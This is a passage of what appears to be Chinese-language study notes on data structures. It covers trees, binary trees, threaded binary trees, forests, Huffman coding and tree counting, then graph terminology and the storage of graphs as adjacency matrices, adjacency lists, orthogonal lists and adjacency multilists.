<li><p>归纳项：</p>
<p>对每一个非空子串建立一个表结点，令其<code>hp</code>域为建立的子表的头指针。其余表结点的尾指针均指向之后的表结点（最后建立的表结点的尾指针为<code>NULL</code>）。</p>
</li>
</ul>
</li>
</ol>
<h1 id="第6章-树和二叉树"><a href="#第6章-树和二叉树" class="headerlink" title="第6章 树和二叉树"></a>第6章 树和二叉树</h1><p>前面讨论了线性结构，下面开始讨论一类重要的非线性数据结构——树型结构（重点是二叉树）。</p>
<h2 id="6-1-树的定义和基本术语"><a href="#6-1-树的定义和基本术语" class="headerlink" title="6.1 树的定义和基本术语"></a>6.1 树的定义和基本术语</h2><ol>
<li><p><strong>树（Tree）</strong>是n（n≥0）个结点的有限集：</p>
<ul>
<li>n=0时为空树；</li>
<li>在任意一棵非空树中：<ul>
<li>有且仅有一个特定的称为<strong>根（Root）</strong>的结点（n=1时仅有一个根结点）；</li>
<li>n&gt;1时，其余结点可分为若干个互不相交的有限集，其中每一个集合本身又是一棵树，并且称为根的<strong>子树（SubTree）</strong>。</li>
</ul>
</li>
</ul>
</li>
<li><p>和广义表的定义类似，树的结构定义也是一个递归的定义，因为在定义中又用到了树的概念，这也是树的固有特性。</p>
</li>
<li><p>树的其他表示形式：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%A0%91%E7%9A%84%E5%85%B6%E4%BB%96%E4%B8%89%E7%A7%8D%E8%A1%A8%E7%A4%BA%E6%B3%95.png" alt="树的其他三种表示法"></p>
</li>
<li><p>一般来说，分等级的分类方案都可用树这种层次结构来表示。</p>
</li>
<li><p>基本术语：</p>
<ul>
<li><strong>结点</strong>：包含一个数据元素和若干个指向其子树的分支；</li>
<li>（结点的）<strong>度（Degree）</strong>：结点拥有的子树的个数；</li>
<li><strong>叶子（Leaf）</strong>：度为零的结点，也称终端结点；</li>
<li><strong>分支结点</strong>：度不为零的结点，也称非终端结点（除根结点之外的分支结点也称内部结点）；</li>
<li>（树的）<strong>度</strong>：树内各结点的度的最大值；</li>
<li><strong>孩子（Child）</strong>：结点的子树的根；</li>
<li><strong>双亲（Parent）</strong>：上一条提到的结点（一个结点）；</li>
<li><strong>兄弟（Sibling）</strong>：同一个双亲的孩子之间互称兄弟；</li>
<li><strong>祖先</strong>：从根到该结点所经分支上的所有结点；</li>
<li><strong>子孙</strong>：以某结点为根的子树中的任一结点都称为该结点的子孙；</li>
<li><strong>层次（Level）</strong>：从根开始定义，根为第一层，根的孩子为第二层。若某结点在第l层，则其子树的根就在第l+1层；</li>
<li><strong>堂兄弟</strong>：双亲在同一层的结点互为堂兄弟；</li>
<li>（树的）<strong>深度（Depth）</strong>：树中结点的最大层次，也称高度；</li>
<li><strong>有序树</strong>：树中结点的各子树从左至右是有次序的，不能互换。有序树中最左边的子树的根称为第一个孩子，最右边的称为最后一个孩子；</li>
<li><strong>无序树</strong>：树中结点的各子树是没有次序的，可以互换；</li>
<li><strong>森林（Forest）</strong>：m（m≥0）棵互不相交的树的集合。树中每个结点的子树的集合即为森林。由此，也可以用森林和树的相互递归的定义来描述树。</li>
</ul>
</li>
</ol>
<h2 id="6-2-二叉树"><a href="#6-2-二叉树" class="headerlink" title="6.2 二叉树"></a>6.2 二叉树</h2><h3 id="6-2-1-二叉树的定义"><a href="#6-2-1-二叉树的定义" class="headerlink" title="6.2.1 二叉树的定义"></a>6.2.1 二叉树的定义</h3><ol>
<li><p><strong>二叉树（Binary Tree）</strong>是另一种树型结构：</p>
<ul>
<li>每个结点<strong>至多</strong>只有两棵子树（即不存在度大于2的结点）；</li>
<li>子树有左右之分，次序不能任意颠倒。</li>
</ul>
</li>
<li><p>二叉树或为空，或是由一个根结点加上两棵分别称为左子树和右子树的、互不相交的二叉树组成。</p>
<p>即，二叉树可以是空树、可以是只有一个结点的树、可以是根只有左子树的树、可以是根只有右子树的树、可以是一般的二叉树。</p>
</li>
<li><p>完全二叉树和满二叉树是两种特殊形态的二叉树：</p>
<ul>
<li><p>一棵深度为$k$且有$2^{k}-1$个结点的二叉树称为<strong>满二叉树</strong>。</p>
<p>特点是每一层上的结点数都是最大结点数。</p>
</li>
<li><p>从根结点起，从上到下、从左到右对满二叉树的结点进行连续编号。</p>
<p>深度为k的有n个结点的二叉树，当且仅当其每一个结点都与深度为k的满二叉树中编号从1至n的结点一一对应时，称之为<strong>完全二叉树</strong>。（满二叉树从右下角向左减少）</p>
<p>特点是</p>
<ul>
<li>叶子结点只可能在层次最大的两层上出现；</li>
<li>对任一结点，若其右分支下的子孙的最大层次为l，则其左分支下的子孙的最大层次必为l或l+1。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="6-2-2-二叉树的性质"><a href="#6-2-2-二叉树的性质" class="headerlink" title="6.2.2 二叉树的性质"></a>6.2.2 二叉树的性质</h3><ol>
<li><p><strong>性质1 在二叉树的第$i$层上至多有$2^{i-1} (i\ge 1)$个结点</strong></p>
<p>等比数列通项公式。</p>
</li>
<li><p><strong>性质2 深度为$k$的二叉树至多有$2^{k}-1 (k\ge 1)$个结点</strong></p>
<p>等比数列前$k$项和。</p>
</li>
<li><p><strong>性质3 对任何一棵二叉树$T$，如果其叶子结点数为$n_{0}$，度为2的结点数为$n_{2}$，则$n_{0}=n_{2}+1$</strong></p>
<ul>
<li>从下往上看：结点由度为0、度为1和度为2的结点组成，故结点总数$n=n_{0}+n_{1}+n_{2}$；</li>
<li>从上往下看：除根结点外，每个结点或接受了度为1的结点发出的一个分支，或接受了度为2的结点发出的两个分支，故有$n-1=n_{1}+2n_{2}$。</li>
</ul>
</li>
<li><p><strong>性质4 具有$n$个结点的完全二叉树的深度为$\lfloor log_{2}n\rfloor +1$</strong></p>
<p>设深度为$k$：</p>
<ul>
<li>$2^{k-1}-1$是$k-1$层的结点总数上限，故有$n&gt;2^{k-1}-1$；</li>
<li>$2^{k}-1$是$k$层的结点总数上限，故有$n\le 2^{k}-1$。</li>
</ul>
<p>解得$k-1\le log_{2}n&lt;k$，因为$k$是整数，所以$k=\lfloor log_{2}n\rfloor +1$。</p>
</li>
<li><p><strong>性质5 如果对一棵有$n$个结点的完全二叉树的结点按层序编号（从上到下、从左到右），则对任一结点$i(1\le i\le n)$，有</strong></p>
<ul>
<li><strong>如果$i=1$，则结点$i$是二叉树的根，无双亲；如果$i&gt;1$，则其双亲PARENT(i)是结点$\lfloor i/2\rfloor$；</strong></li>
<li><strong>如果$2i&gt;n$，则结点$i$无左孩子（结点$i$为叶子结点）；否则其左孩子LCHILD(i)是结点$2i$；</strong></li>
<li><strong>如果$2i+1&gt;n$，则结点$i$无右孩子；否则其右孩子RCHILD(i)是结点$2i+1$。</strong></li>
</ul>
</li>
</ol>
<h3 id="6-2-3-二叉树的存储结构"><a href="#6-2-3-二叉树的存储结构" class="headerlink" title="6.2.3 二叉树的存储结构"></a>6.2.3 二叉树的存储结构</h3><ol>
<li><p><strong>顺序存储结构</strong>：用一组地址连续的存储单元依次自上而下、自左至右存储<strong>完全二叉树</strong>上的结点元素。若要存储一般二叉树，则用零占位。</p>
</li>
<li><p><strong>链式存储结构</strong>：结点至少包含3个域：数据域和左、右指针域(二叉链表）。有时为了便于找到结点的双亲，还可增加一个指向其双亲结点的指针域（三叉链表）。</p>
<p>链表的头指针指向二叉树的根结点。</p>
<p>在含有n个结点的二叉链表中有2n-(n-1)=n+1个空链域，可以存储其他有用信息，从而得到另一种链式存储结构——线索链表。</p>
</li>
</ol>
<h2 id="6-3-遍历二叉树和线索二叉树"><a href="#6-3-遍历二叉树和线索二叉树" class="headerlink" title="6.3 遍历二叉树和线索二叉树"></a>6.3 遍历二叉树和线索二叉树</h2><h3 id="6-3-1-遍历二叉树"><a href="#6-3-1-遍历二叉树" class="headerlink" title="6.3.1 遍历二叉树"></a>6.3.1 遍历二叉树</h3><ol>
<li>为了在树中查找具有某种特征的结点，或者对树中全部结点逐一进行某种处理，提出了<strong>遍历二叉树（traversing binary tree）</strong>的问题，即如何按某条搜索路径巡访树中每个结点，使得每个结点均被访问一次，而且仅被访问一次。</li>
<li>线性结构的遍历很容易，树这种非线性结构的遍历则不然。所以需要将二叉树排列在一个线性队列上，从而便于遍历。</li>
<li>由于二叉树由根结点、左子树和右子树这三个基本单元组成，因此，若能依次遍历这三部分，便是遍历了整个二叉树。</li>
<li>二叉树的遍历分为<strong>先（根）序遍历</strong>、<strong>中（根）序遍历</strong>和<strong>后（根）序遍历</strong>。</li>
<li>遍历二叉树是二叉树各种操作的基础，可以在遍历过程中求结点的双亲、求结点的孩子、判定结点所在层次等。反之，也可在遍历过程中生成结点，建立二叉树的存储结构。</li>
<li>除了先序、中序和后序遍历，还可从上到下、从左到右按层次进行。</li>
<li>对n个结点的二叉树，遍历算法的时间复杂度为O(n)，空间复杂度也为O(n)。</li>
</ol>
<h3 id="6-3-2-线索二叉树"><a href="#6-3-2-线索二叉树" class="headerlink" title="6.3.2 线索二叉树"></a>6.3.2 线索二叉树</h3><ol>
<li><p>遍历二叉树是对一个非线性结构进行线性化操作的过程，可以得到某个结点的前驱和后继。</p>
</li>
<li><p>但是当以二叉链表存储时，只能找到结点的左右孩子，而不能直接得到结点在任一序列中的前驱和后继信息。</p>
</li>
<li><p>这些信息只能在遍历的动态过程中才能得到，为了保存这些信息，可以在结点结构中增加两个指针域fwd和bkwd分别指示前驱和后继信息。</p>
<p>这样就可以使结构的存储密度大大降低。</p>
</li>
<li><p>若结点有左子树，则其lchild域指示其左孩子，否则指示其前驱。再增加LTag域，为0说明是第一种情况，为1说明是第二种情况。rchild和RTag同理。</p>
<p>以这种结点结构构成的二叉链表作为二叉树的存储结构，叫做<strong>线索链表</strong>。</p>
<p>其中指向结点前驱和后继的指针叫做<strong>线索</strong>，加上线索的二叉树叫做<strong>线索二叉树（Threaded Binary Tree）</strong>。</p>
<p>图(a)为中序线索二叉树，图(b)为与其对应的中序线索链表：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E7%BA%BF%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91.jpeg" alt="线索二叉树"></p>
</li>
<li><p>对二叉树以某种次序遍历使其变为线索二叉树的过程叫做<strong>线索化</strong>。</p>
</li>
<li><p>在线索树上进行遍历，只要先找到序列中的第一个结点，然后依次找结点后继直至其后继为空时而止。</p>
<p>为找到中间结点的后继，根据中序遍历的特点，可知其后继是子树中根结点的右结点最左下的结点。根据这个思路可以沿着指针直至Tag域为1。前驱同理。</p>
</li>
<li><p>在后序线索树中找结点后继较为复杂：</p>
<ul>
<li>若为二叉树的根结点，则其后继为空；</li>
<li>若为右孩子或双亲无右子树的左孩子，则其后继为双亲；</li>
<li>若为左孩子且双亲有右子树，则其后继为双亲的右子树上按后序遍历列出的第一个结点。</li>
</ul>
</li>
<li><p>在中序线索二叉树上遍历二叉树，虽然时间复杂度还是O(n)，但常数因子比上节讨论的算法小，且不需要设栈。</p>
<p>因此，若在某程序中所用二叉树需经常遍历或查找结点在遍历所得线性序列中的前驱和后继，则应采用线索链表作存储结构。</p>
</li>
<li><p>在二叉树的线索链表上添加头结点，令：</p>
<ul>
<li>lchild域的指针指向二叉树的根结点；</li>
<li>rchild域的指针指向中序遍历时访问的最后一个结点；</li>
</ul>
<p>令二叉树中序序列中的第一个结点的lchild域的指针和最后一个结点的rchild域的指针均指向头结点。</p>
<p>这好比为二叉树建立了一个双向线索链表，既可以从第一个结点起顺后继进行遍历，也可以从最后一个结点起顺前驱进行遍历。</p>
</li>
<li><p>二叉树的线索化实质是将二叉链表中的空指针改为指向前驱或后继的元素，而前驱或后继的信息只有在遍历时才能得到，因此线索化的过程即为在遍历的过程中修改空指针的过程。</p>
</li>
<li><p>在遍历过程中，记下访问结点的先后关系，附设一个指针pre始终指向刚刚访问过的结点，若指针p指向当前访问的结点，则pre指向它的前驱。</p>
</li>
</ol>
<h2 id="6-4-树和森林"><a href="#6-4-树和森林" class="headerlink" title="6.4 树和森林"></a>6.4 树和森林</h2><h3 id="6-4-1-树的存储结构"><a href="#6-4-1-树的存储结构" class="headerlink" title="6.4.1 树的存储结构"></a>6.4.1 树的存储结构</h3><ol>
<li><p><strong>双亲表示法</strong></p>
<p>以一组连续空间存储树的结点，同时在每个结点中指示其双亲结点在链表中的位置：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%8F%8C%E4%BA%B2%E8%A1%A8%E7%A4%BA%E6%B3%95.png" alt="双亲表示法"></p>
<p>原理：利用了“每个结点（除根以外）只有唯一的双亲”的性质。</p>
<p>优点：可以快速找到根。</p>
<p>缺点：求结点的孩子时需要遍历整个结构。</p>
</li>
<li><p><strong>孩子表示法</strong></p>
<p>每个结点有多个指针域，每个指针指向一棵子树的根结点：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%AD%A9%E5%AD%90%E8%A1%A8%E7%A4%BA%E6%B3%95.png" alt="孩子表示法"></p>
<p>原理：</p>
<ul>
<li>根据树的度来确定要有几个指针域，但要么浪费空间，要么操作不便。</li>
<li>把每个结点的孩子结点排列起来，看成是一个线性表，且以单链表作存储结构。所有结点的链表头指针又组成一个线性表，采用顺序存储结构。</li>
</ul>
<p>优点：便于那些涉及孩子的操作的实现。</p>
<p>缺点：不适用于涉及双亲的操作。</p>
</li>
<li><p>可以将前两种方法结合起来：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%AD%A9%E5%AD%90%E5%8F%8C%E4%BA%B2%E7%BB%93%E5%90%88.jpeg" alt="孩子双亲结合"></p>
</li>
<li><p><strong>孩子兄弟表示法</strong>（二叉树表示法/二叉链表表示法）</p>
<p>以二叉链表作树的存储结构，链表中结点的两个链域分别指向该结点的第一个孩子结点和下一个兄弟结点，分别命名为firstchild域和nextsibling域：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E4%BA%8C%E5%8F%89%E9%93%BE%E8%A1%A8%E8%A1%A8%E7%A4%BA%E6%B3%95.png" alt="二叉链表表示法"></p>
<p>优点：便于实现各种树的操作，如易于实现找结点孩子等的操作。</p>
</li>
</ol>
<h3 id="6-4-2-森林与二叉树的转换"><a href="#6-4-2-森林与二叉树的转换" class="headerlink" title="6.4.2 森林与二叉树的转换"></a>6.4.2 森林与二叉树的转换</h3><ol>
<li><p>上面我们看到，树和二叉树都可用二叉链表作为存储结构（是相同的二叉链表的不同解释），所以二叉链表可以作为媒介来导出树与二叉树之间的一个对应关系：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="树与二叉树"></p>
<p>给定一棵树，可以找到唯一一棵二叉树与之对应。</p>
</li>
<li><p>从树的二叉链表表示可知，它对应的二叉树的右子树必为空。既然有这个空位，就可以依次将若干棵树（森林）转换成二叉树并通过这个空位相连：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%A3%AE%E6%9E%97%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="森林与二叉树"></p>
</li>
</ol>
<h3 id="6-4-3-树和森林的遍历"><a href="#6-4-3-树和森林的遍历" class="headerlink" title="6.4.3 树和森林的遍历"></a>6.4.3 树和森林的遍历</h3><ol>
<li><p>可以先根遍历树（ABCDE），也可以<strong>后根</strong>遍历树（BDCEA）。注意子树从左至右按次序遍历。</p>
</li>
<li><p>根据森林和树相互递归的定义，遍历森林也有两种方法：</p>
<ul>
<li><p>先序遍历森林（对应的二叉树的先序遍历）</p>
<p>第一棵树的根结点-&gt;先序遍历第一棵树的根结点的子树森林-&gt;先序遍历剩余森林</p>
<p>ABCDEFGHIJ</p>
</li>
<li><p>中序遍历森林（对应的二叉树的中序遍历）</p>
<p>中序遍历第一棵树的根结点的子树森林-&gt;第一棵树的根结点-&gt;中序遍历剩余森林</p>
<p>BCDAFEHJIG</p>
</li>
</ul>
</li>
<li><p>当以二叉链表作树的存储结构时，树的先根遍历和<strong>后根</strong>遍历可借用二叉树的先序遍历和中序遍历的算法实现。</p>
</li>
</ol>
<h2 id="6-5-树与等价问题"><a href="#6-5-树与等价问题" class="headerlink" title="6.5 树与等价问题"></a>6.5 树与等价问题</h2><ol>
<li>自反、对称、传递，则为等价关系。</li>
<li>划分等价类的算法思想也可用于求网络的最小生成树等图的算法中。</li>
</ol>
<h2 id="6-6-赫夫曼树及其应用"><a href="#6-6-赫夫曼树及其应用" class="headerlink" title="6.6 赫夫曼树及其应用"></a>6.6 赫夫曼树及其应用</h2><p>赫夫曼（Huffman）树，又称最优树，是一类带权路径长度最短的树。</p>
<h3 id="6-6-1-最优二叉树（赫夫曼树）"><a href="#6-6-1-最优二叉树（赫夫曼树）" class="headerlink" title="6.6.1 最优二叉树（赫夫曼树）"></a>6.6.1 最优二叉树（赫夫曼树）</h3><ol>
<li><p><strong>路径</strong>：从树中一个结点到另一个结点之间的分支构成这两个结点之间的路径。</p>
</li>
<li><p>（结点的）<strong>路径长度</strong>：路径上的分支数目。</p>
</li>
<li><p>（树的）<strong>路径长度</strong>：从树根到每一结点的路径长度之和。</p>
<p>完全二叉树就是这种路径长度最短的二叉树。</p>
</li>
<li><p>（结点的）<strong>带权路径长度</strong>：从该结点到树根之间的路径长度与结点上权的乘积（叶子结点）。</p>
</li>
<li><p>（树的）<strong>带权路径长度</strong>：树中所有叶子结点的带权路径长度之和，通常记作$$WPL=\sum_{k=1}^{n}w_{k}l_{k}$$</p>
</li>
<li><p>假设有n个权值，试构造一棵有n个叶子结点的二叉树，带相应的权值，则其中带权路径长度WPL最小的二叉树称做<strong>最优二叉树</strong>或<strong>赫夫曼树</strong>。</p>
</li>
<li><p>构造赫夫曼树的方法：</p>
<ul>
<li>将n个权值构成n棵只有一个带权根结点的二叉树，构成集合F；</li>
<li>在F中选取两棵权值最小的树作为左右子树构造一棵新的二叉树，根结点的权值为二者之和；</li>
<li>在F中删除这两棵树，添加新生成的二叉树；</li>
<li>重复上上步和上步，直到F中只含一棵树为止。</li>
</ul>
<p>这棵树便是赫夫曼树。</p>
</li>
</ol>
<h3 id="6-6-2-赫夫曼编码"><a href="#6-6-2-赫夫曼编码" class="headerlink" title="6.6.2 赫夫曼编码"></a>6.6.2 赫夫曼编码</h3><ol>
<li>为了使字符串的编码尽可能短，可以将常用字符的编码变短，不常用字符的编码变长。但是这种长短不等的编码导致无法“断句”，为解决这一问题，必须让任一字符的编码都不是另一个字符编码的前缀。这种编码称做<strong>前缀编码</strong>。</li>
<li>若约定二叉树左右分支分别表示字符<code>&#39;0&#39;</code>和<code>&#39;1&#39;</code>，那么从根结点到某一叶子结点的路径就唯一确定了一种字符编码。</li>
<li>设计电文总长最短的二进制前缀编码即为以n种字符出现的频率作权，设计一棵赫夫曼树的问题，由此得到的二进制前缀编码便称为<strong>赫夫曼编码</strong>。</li>
<li>赫夫曼树中没有度为1的结点，这类树又称严格的（strict，正则的）二叉树。</li>
<li>一棵有n个叶子结点的赫夫曼树共有2n-1个结点，可以存储在一个大小为2n-1的一维数组中。</li>
<li>赫夫曼树具体算法请走<a href="https://www.superpung.xyz/Data-Structures-Experiment-9/">传送门</a>。</li>
</ol>
<h2 id="6-7-回溯法与树的遍历"><a href="#6-7-回溯法与树的遍历" class="headerlink" title="6.7 回溯法与树的遍历"></a>6.7 回溯法与树的遍历</h2><ol>
<li>有一类问题要求一组解、全部解或最优解，而不是根据某种确定的计算法则，是利用试探和<strong>回溯（Backtracking）</strong>的搜索技术求解。</li>
<li>回溯法也是设计递归过程的一种重要方法，实质上是一个先序遍历一棵“状态树”的过程。这棵树不是遍历前预先建立的，而是隐含在遍历过程中的。</li>
</ol>
<h2 id="6-8-树的计数"><a href="#6-8-树的计数" class="headerlink" title="6.8 树的计数"></a>6.8 树的计数</h2><ol>
<li>两棵二叉树相似，是指二者都为空树或二者均不为空树，且它们的左右子树分别相似。</li>
<li>两棵二叉树等价，是指二者不仅相似，而且所有对应结点上的数据元素都相同。</li>
<li>二叉树的计数问题就是讨论具有$n$个结点、互不相似的二叉树的数目$b_{n}$。</li>
<li>通过数学方法的计算（书152～154页），得出结论：含有$n$个结点的不相似的二叉树有$\frac{1}{n+1}C_{2n}^{n}$棵。</li>
<li>任意一棵二叉树结点的前序序列和中序序列是唯一的，反过来，给定结点的前序序列和中序序列（或给定中序序列和后序序列）也可以确定一棵二叉树；但给定前序序列和后序序列，无法确定一棵二叉树。</li>
<li>首先根据前序遍历得知根结点-&gt;在中序遍历中划分出左右子树-&gt;根据前序遍历得知根结点的左右孩子-&gt;左右孩子再次将中序遍历划分为四棵子树-&gt;……</li>
</ol>
<h1 id="第7章-图"><a href="#第7章-图" class="headerlink" title="第7章 图"></a>第7章 图</h1><p><strong>图（Graph）</strong>是一种较线性表和树更为复杂的数据结构。</p>
<p>图没有线性表的线性关系，也没有树形结构的层次关系，而是任意的关系，图中任意两个数据元素之间都可能相关。</p>
<h2 id="7-1-图的定义和术语"><a href="#7-1-图的定义和术语" class="headerlink" title="7.1 图的定义和术语"></a>7.1 图的定义和术语</h2><ol>
<li>基本术语：<ul>
<li><strong>顶点（Vertex）</strong>：图中的数据元素；</li>
<li><strong>弧（Arc）</strong>：若顶点v和w有关系，则从v到w存在一条弧；</li>
<li><strong>弧尾（Tail）</strong>：弧的初始点（Initial node）；</li>
<li><strong>弧头（Head）</strong>：弧的终端点（Terminal node）；</li>
<li><strong>有向图（Digraph）</strong>：弧为单向；</li>
<li><strong>边（Edge）</strong>：若弧为双向，则用边代替（不考虑顶点到自身的弧或边）；</li>
<li><strong>无向图（Undigraph）</strong>：弧为双向；</li>
<li><strong>完全图（Completed graph）</strong>：顶点数为n时，有n(n-1)/2条边的无向图；</li>
<li><strong>有向完全图</strong>：具有n(n-1)条弧的有向图；</li>
<li><strong>稀疏图（Sparse graph）</strong>：有很少条边或弧（如e&lt;nlogn）的图；</li>
<li><strong>稠密图（Dense graph）</strong>：与稀疏图相反；</li>
<li><strong>权（Weight）</strong>：与图的边或弧相关的数，可以表示从一个顶点到另一个顶点的距离或耗费；</li>
<li><strong>网（Network）</strong>：带权的图；</li>
<li><strong>子图（Subgraph）</strong>：一个图的顶点和边或弧均为另一个图的子集，则称这个图是另一个图的子图；</li>
<li><strong>邻接点（Adjacent）</strong>：无向图中之间存在边的两顶点互为邻接点；</li>
<li><strong>依附（Incident）</strong>：无向图中两顶点之间的边依附于这两个顶点，或称这条边和这两个顶点<strong>相关联</strong>；</li>
<li><strong>度（Degree）</strong>：和顶点v相关联的边的数目，记为TD(v)；</li>
<li><strong>邻接自</strong>、<strong>邻接到</strong>：有向图中若顶点v到顶点v’存在一条弧，则称顶点v邻接到顶点v’，顶点v’邻接自顶点v，这条弧和顶点v,v’相关联；</li>
<li><strong>入度（Indegree）</strong>：有向图中以顶点v为头的弧的数目，记为ID(v)；</li>
<li><strong>出度（Outdegree）</strong>：有向图中以顶点v为尾的弧的数目，记为OD(v)，TD(v)=ID(v)+OD(v)，<strong>所有顶点的度数之和为边数的2倍</strong>；</li>
<li><strong>路径（Path）</strong>：是一个顶点序列，有向图的路径也是有向的，路径的长度是路径上的边或弧的数目；</li>
<li><strong>环（Cycle）</strong>：第一个顶点和最后一个顶点相同的路径，也称<strong>回路</strong>；</li>
<li><strong>简单路径</strong>：顶点序列中不重复出现的路径；</li>
<li><strong>简单环</strong>：除第一个顶点和最后一个顶点外，其余顶点不重复出现的回路，也称简单回路；</li>
<li><strong>连通</strong>：无向图中两顶点之间有路径，则称这两个顶点连通；</li>
<li><strong>连通图（Connected Graph）</strong>：任意两个顶点都连通的图；</li>
<li><strong>连通分量（Connected Component）</strong>：无向图中的<strong>极大连通子图</strong>；</li>
<li><strong>强连通图</strong>：任意两个顶点之间都双向连通的有向图；</li>
<li><strong>强连通分量</strong>：有向图中的极大强连通子图；</li>
<li><strong>生成树</strong>：一个连通图的极小连通子图，含有原图的全部n个顶点，但只有足以构成一棵树的n-1条边，<strong>在一棵生成树上添加一条边则必定构成一个环</strong>（两个顶点之间有了第二条路径）（有n个顶点的图：若边数小于n-1，则是非连通图；若边数多于n-1，则一定有环；若边数等于n-1，也不一定是生成树）；</li>
<li><strong>生成森林</strong>：一个有向图的生成森林由若干棵有向树组成（如果一个有向图恰有一个顶点的入度为0，其余顶点的入度均为1，则是一棵有向树），含有原图的全部结点，但只有足以构成若干棵不相交的有向树的弧；</li>
</ul>
</li>
<li>无法将图中顶点排列成一个线性序列，不存在次序关系，所以“顶点的位置”和“邻接点的位置”都只是一个相对的概念。</li>
</ol>
<h2 id="7-2-图的存储结构"><a href="#7-2-图的存储结构" class="headerlink" title="7.2 图的存储结构"></a>7.2 图的存储结构</h2><p>图的结构比较复杂，任意两个顶点之间都可能存在联系，则不能以存储区的物理位置来表示元素之间的关系，即图没有顺序映像的存储结构。</p>
<p>可以用多重链表表示图，这是一种最简单的链式映像结构，但由于各结点的度数不能确定，要么浪费存储单元，要么操作不便。</p>
<h3 id="7-2-1-数组表示法"><a href="#7-2-1-数组表示法" class="headerlink" title="7.2.1 数组表示法"></a>7.2.1 数组表示法</h3><ol>
<li>用两个数组：<ul>
<li>一个存储数据元素（顶点）的信息；</li>
<li>一个存储数据元素之间的关系（边或弧）的信息。</li>
</ul>
</li>
<li>以邻接矩阵表示有n个顶点的图时，需存放n个顶点信息和$n^{2}$个弧信息的存储量。可以对无向图的对称邻接矩阵压缩存储。</li>
<li>借助邻接矩阵，易判定两顶点之间是否有边或弧相连，并且对于无向图，某一行（或一列）的元素之和就是对应顶点的度（有向图的行和为出度、列和为入度）。</li>
<li>网的邻接矩阵可以定义为：<ul>
<li>若两顶点间有弧，则对应值为权值；</li>
<li>若两顶点间无弧，则对应值为∞。</li>
</ul>
</li>
</ol>
<h3 id="7-2-2-邻接表"><a href="#7-2-2-邻接表" class="headerlink" title="7.2.2 邻接表"></a>7.2.2 邻接表</h3><ol>
<li><strong>邻接表（Adjacency List）</strong>是图的一种链式存储结构。</li>
<li>邻接表中：<ul>
<li>图中每个顶点都建立一个单链表，每个单链表中的结点表示依附于“起始”顶点的边或弧；</li>
<li>每个<strong>表结点</strong>由3个域组成：<ul>
<li>邻接点域（adjvex）指示与“起始”顶点邻接的点；</li>
<li>链域（nextarc）指示下一条边或弧的结点；</li>
<li>数据域（info）存储和边或弧相关的信息（如权值等）；</li>
</ul>
</li>
<li>每个链表附设一个<strong>表头结点</strong>：<ul>
<li>链域（firstarc）指向链表中第一个结点；</li>
<li>数据域（data）存储“起始”顶点的名或其他有关信息；</li>
</ul>
</li>
<li>表头结点通常以顺序结构的形式存储，以便随机访问任一顶点的链表。</li>
</ul>
</li>
<li>由于无向图以邻接表存储时，需要将一条边分成两条弧存储，所以当边很少（稀疏）的情况下，邻接表比邻接矩阵更省空间，尤其是当和边相关的信息较多时。</li>
<li>无向图的邻接表中，链表的结点数就是对应顶点的度；有向图的邻接表中，链表的结点数只是对应顶点的出度，为求入度，必须遍历整个邻接表。</li>
<li>为便于求有向图的入度，可以建立一个有向图的<strong>逆邻接表</strong>，即将所有边逆向存储。</li>
<li>建立邻接表或逆邻接表时，若输入的顶点信息即为顶点的编号，则时间复杂度为O(n+e)；否则需要查找顶点的位置，则时间复杂度为O(n·e)。</li>
<li>邻接表的优点是易找到任一顶点的第一个邻接点和下一个邻接点，缺点是需要搜索才能判断任意两个顶点之间是否有边或弧相连。</li>
</ol>
<h3 id="7-2-3-十字链表"><a href="#7-2-3-十字链表" class="headerlink" title="7.2.3 十字链表"></a>7.2.3 十字链表</h3><ol>
<li><p><strong>十字链表（Orthogonal List）</strong>是有向图的另一种链式存储结构，是将有向图的邻接表和逆邻接表结合起来得到的。</p>
</li>
<li><p>十字链表中：</p>
<ul>
<li>弧结点有5个域：<ul>
<li>尾域（tailvex）指示弧尾顶点；</li>
<li>头域（headvex）指示弧头结点；</li>
<li>链域hlink指向弧头相同的下一条弧；</li>
<li>链域tlink指向弧尾相同的下一条弧；</li>
<li>info域指向该弧的相关信息；</li>
</ul>
</li>
<li>弧头相同的弧在同一链表上，弧尾相同的弧也在同一链表上；</li>
<li>顶点结点有3个域：<ul>
<li>data域存储和顶点相关的信息（如顶点的名称等）；</li>
<li>firstin链域指向以该顶点为弧头的第一个弧结点；</li>
<li>firstout链域指向以该顶点尾弧尾的第一个弧结点；</li>
</ul>
</li>
</ul>
</li>
<li><p>可以将有向图的邻接矩阵看成是稀疏矩阵，这样十字链表也可以看成是邻接矩阵的链表存储结构。</p>
</li>
<li><p>图的十字链表的弧结点：</p>
<ul>
<li>所在链表非循环链表；</li>
<li>结点之间相对位置自然形成，不一定按顶点序号有序；</li>
</ul>
<p>表头结点即顶点结点：</p>
<ul>
<li>之间是顺序存储，不是链接。</li>
</ul>
</li>
<li><p>在十字链表中既容易找到以某顶点为尾的弧，也容易找到以某顶点为头的弧，因而也容易求得顶点的出度和入度。</p>
</li>
<li><p>建立十字链表的时间复杂度和建立邻接表是相同的。</p>
</li>
</ol>
<h3 id="7-2-4-邻接多重表"><a href="#7-2-4-邻接多重表" class="headerlink" title="7.2.4 邻接多重表"></a>7.2.4 邻接多重表</h3><ol>
<li><strong>邻接多重表（Adjacency Multilist）</strong>是无向图的另一种链式存储结构，和十字链表类似。</li>
<li>由于无向图的邻接表无法将一条边只存储一次，换句话说，一条边的两个结点不在一起，从而使得标记一条边或删除一条边等操作很不便。</li>
<li>邻接多重表中：<ul>
<li>边结点有6个域：<ul>
<li>mark为标志域，用以标记该条边是否被搜索过；</li>
<li>ivex为边依附的一个顶点；</li>
<li>jvex为边依附的另一个顶点；</li>
<li>ilink指向下一条依附于顶点ivex的边；</li>
<li>jlink指向下一条依附于顶点jvex的边；</li>
